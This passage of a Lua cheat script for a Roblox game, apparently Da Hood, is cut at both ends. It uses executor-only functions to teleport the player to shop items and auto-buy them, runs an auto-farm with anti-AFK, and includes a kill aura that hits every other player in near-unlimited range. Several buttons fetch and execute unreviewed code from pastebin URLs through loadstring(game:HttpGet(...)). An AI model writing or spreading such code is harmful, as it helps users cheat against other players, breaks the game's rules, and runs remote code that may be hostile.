wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Double-Barrel SG]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Double-Barrel SG Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["18 [Double-Barrel SG Ammo] - $62"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Double-Barrel SG]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy AUG", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[AUG] - $2421"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[AUG]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy AUG Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["90 [AUG Ammo] - $82"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[AUG]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Shotgun", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Shotgun] - $1288"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Shotgun]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Shotgun Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["20 [Shotgun Ammo] - $62"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Shotgun]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy AK47", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[AK47] - $2318"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[AK47]"]:Activate()
    wait()
end
end)
Section:NewButton("BUY AK47 Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["90 [AK47 Ammo] - $82"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[AK47]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy SMG", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[SMG] - $773"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[SMG]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy SMG Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["80 [SMG Ammo] - $62"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[SMG]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy AR", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[AR] - $1030"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[AR]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy AR Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["100 [AR Ammo] - $77"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[AR]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy SilencerAR", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[SilencerAR] - $1288"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[SilencerAR]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy SilencerAR Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["120 [SilencerAR Ammo] - $77"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[SilencerAR]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy LMG", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[LMG] - $3863"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[LMG]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy LMG Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["200 [LMG Ammo] - $309"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[LMG]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy RPG", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[RPG] - $20600"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[RPG]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy RPG Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["5 [RPG Ammo] - $1030"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[RPG]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Glock", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Glock] - $515"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Glock]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Glock Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["25 [Glock Ammo] - $62"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Glock]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy TacticalShotgun", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[TacticalShotgun] - $1803"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[TacticalShotgun]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy TacticalShotgun Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["20 [TacticalShotgun Ammo] - $62"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[TacticalShotgun]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy P90", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[P90] - $1030"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[P90]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy P90 Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["120 [P90 Ammo] - $62"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[P90]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Silencer", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Silencer] - $567"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Silencer]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Silencer Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["25 [Silencer Ammo] - $52"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Silencer]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Money Gun", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Money Gun] - $800"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Money Gun]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Popcorn", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Popcorn] - $7"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Popcorn]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy HotDog", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[HotDog] - $8"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[HotDog]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Knife", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Knife] - $155"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Knife]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Key", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Key] - $129"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Key]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Taser", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Taser] - $1030"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Taser]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Nunchucks", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Nunchucks] - $464"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Nunchucks]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Lockpick", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[LockPicker] - $129"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[LockPicker]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Heavy Weights", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[HeavyWeights] - $258"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[HeavyWeights]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Weights", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Weights] - $124"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Weights]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Lettuce", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Lettuce] - $5"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Lettuce]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Flashlight", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Flashlight] - $10"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Flashlight]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Surgeon Mask", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Surgeon Mask] - $26"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Surgeon Mask]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Medium Armor", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Medium Armor] - $1030"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Medium Armor]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy High-Medium Armor", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[High-Medium Armor] - $2163"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[High-Medium Armor]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Fire Armor", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Fire Armor] - $2060"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Fire Armor]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy TearGas", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[TearGas] - $5150"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[TearGas]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Grenade", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Grenade] - $721"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Grenade]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Flashbang", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Flashbang] - $567"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Flashbang]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Basketball", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Basketball] - $103"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Basketball]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy GrenadeLauncher", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[GrenadeLauncher] - $10300"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[GrenadeLauncher]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy GrenadeLauncher Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["12 [GrenadeLauncher Ammo] - $3090"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[GrenadeLauncher Ammo]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Rifle", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Rifle] - $1597"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Rifle]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Rifle Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["5 [Rifle Ammo] - $258"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Rifle Ammo]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Flowers", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Flowers] - $5"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Flowers]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy SoloBike", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[SoloBike] - $26"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[SoloBike]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy DuoBike", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[DuoBike] - $77"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[DuoBike]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy FoodsCart", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[FoodsCart] - $15"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[FoodsCart]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Flamethrower", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[Flamethrower] - $25750"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Flamethrower]"]:Activate()
    wait()
end
end)
Section:NewButton("Buy Flamethrower Ammo", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["140 [Flamethrower Ammo] - $1597"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        
    end
    plr.Character["[Flamethrower Ammo]"]:Activate()
    wait()
end
end)
local Tab = Window:NewTab("Auto")
local Section = Tab:NewSection("you cant turn it off")
Section:NewButton("AutoFarm Gui (Postman Pat#2011)", "ButtonInfo", function()
loadstring(game:HttpGet('https://pastebin.com/raw/55UhgEKc'))()
end)
Section:NewButton("Auto Weight", "ButtonInfo", function()
local plr = game.Players.LocalPlayer
local Part = game:GetService("Workspace").Ignored.Shop["[HeavyWeights] - $258"]

local Working = false

plr.Character.HumanoidRootPart.CFrame = Part.Head.CFrame
wait(0.5)
fireclickdetector(Part.ClickDetector)
wait(1)
plr.Backpack["[HeavyWeights]"].Parent = plr.Character
wait(1)
Working = true
while Working do
    if TeleportToSafeZone then
        plr.Character.HumanoidRootPart.CFrame = CFrame.new(86.081665, -25.2122707, -337.847443)
    end
    plr.Character["[HeavyWeights]"]:Activate()
    wait()
end
-- | Antiafk
local vu = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:connect(function()
   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
   wait(1)
   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)
end)
Section:NewButton("Auto Lettuce", "ButtonInfo", function()


local localPlayer = game:GetService("Players").LocalPlayer


if localPlayer then

    wait(0.5)
    localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Workspace.Ignored.Shop["[Lettuce] - $5"].Head.CFrame.Position) * CFrame.new(0,5,0)
    

    localPlayer.CharacterAdded:Connect(function()
 
        localPlayer.Character:WaitForChild("Humanoid")
        
        
        wait(0.5)
        localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Workspace.Ignored.Shop["[Lettuce] - $5"].Head.CFrame.Position) * CFrame.new(0,5,0)
    end)
    
    game:GetService("RunService").Stepped:Connect(function()
        fireclickdetector(game.Workspace.Ignored.Shop["[Lettuce] - $5"].ClickDetector)
        wait(0.4)
        localPlayer.Character.Humanoid:EquipTool(localPlayer.Backpack["[Lettuce]"])
        wait(0.4)
        mouse1click()
        wait(0.4)
        mouse1click()
        wait(0.4)
    end)
end


local range = 99e9


local player = game:GetService("Players").LocalPlayer


game:GetService("RunService").RenderStepped:Connect(function()
    local p = game.Players:GetPlayers()
    for i = 2, #p do local v = p[i].Character
        if v and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 and v:FindFirstChild("HumanoidRootPart") and player:DistanceFromCharacter(v.HumanoidRootPart.Position) <= range then
            local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
            if tool and tool:FindFirstChild("Handle") then
                tool:Activate()
                for i,v in next, v:GetChildren() do
                    if v:IsA("BasePart") then
                        firetouchinterest(tool.Handle,v,0)
                        firetouchinterest(tool.Handle,v,1)
                    end
                end
            end
        end
    end
end)
end)
local Tab = Window:NewTab("GUI")
local Section = Tab:NewSection("GUI")
Section:NewButton("Save/TP Position GUI", "ButtonInfo", function()
loadstring(game:HttpGet("https://pastebin.com/raw/40nDHqYW"))()
end)
Section:NewButton("Teleport To Player GUI", "ButtonInfo", function()
loadstring(game:HttpGet("https://pastebin.com/raw/2CRkdFve"))()
end)
Section:NewButton("View Player GUI", "ButtonInfo", function()
loadstring(game:HttpGet("https://pastebin.com/raw/J1fXRQ6P"))()
end)
local Tab = Window:NewTab("Teleport")
local Section = Tab:NewSection("Teleport to maps")
Section:NewButton("Uphill Gunstore", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(481.3045959472656, 48.07050323486328, -620.1513671875)
end)
Section:NewButton("Downhill Gunstore", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-578.5796508789062, 8.314779281616211, -736.3884887695312)
end)
Section:NewButton("Hood Fitness", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-76.4957275390625, 22.700284957885742, -630.9816284179688)
end)
Section:NewButton("Bar", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-264.5504455566406, 48.52669143676758, -446.29254150390625)
end)
Section:NewButton("Admin Base", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-762.7578735351562, -39.65421676635742, -884.7666015625)
end)
Section:NewButton("Bank", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-432.1439208984375, 38.9649658203125, -284.1016540527344)
end)
Section:NewButton("Da Furniture", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-489.1640319824219, 21.8498477935791, -76.60957336425781)
end)
Section:NewButton("School", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-531.3531494140625, 21.74999237060547, 252.47506713867188)
end)
Section:NewButton("Da Casino", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-863.4664306640625, 21.59995460510254, -152.92788696289062)
end)
Section:NewButton("Da Theatre", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1004.9942626953125, 25.10002326965332, -135.17315673828125)
end)
Section:NewButton("Basketball Court", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-896.5643310546875, 21.999818801879883, -528.7317504882812)
end)
Section:NewButton("Hair Salon", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-855.55810546875, 22.005008697509766, -665.0170288085938)
end)
Section:NewButton("FoodsMart", "ButtonInfo", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-906.5833740234375, 22.005002975463867, -653.2225952148438)
end)
Section:NewButton("Mat Laundry", "ButtonInfo", function()
